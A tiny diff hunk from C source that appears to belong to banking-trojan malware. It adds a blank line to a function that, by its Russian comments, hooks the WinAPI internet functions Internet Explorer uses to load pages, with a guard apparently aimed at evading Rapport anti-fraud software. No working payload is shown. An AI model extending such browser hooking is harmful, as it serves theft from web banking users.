@@ -1432,6 +1432,7 @@ bool HookInternetExplorerApi() {
 	// HookInternetExplorerApi - функция вешает хуки на интернет API
 	// которые использует интернет експлорер для загрузки страниц
 
+
 	IEDBG("Перехват функций WinAPI");
 
 	#ifdef antirapportH
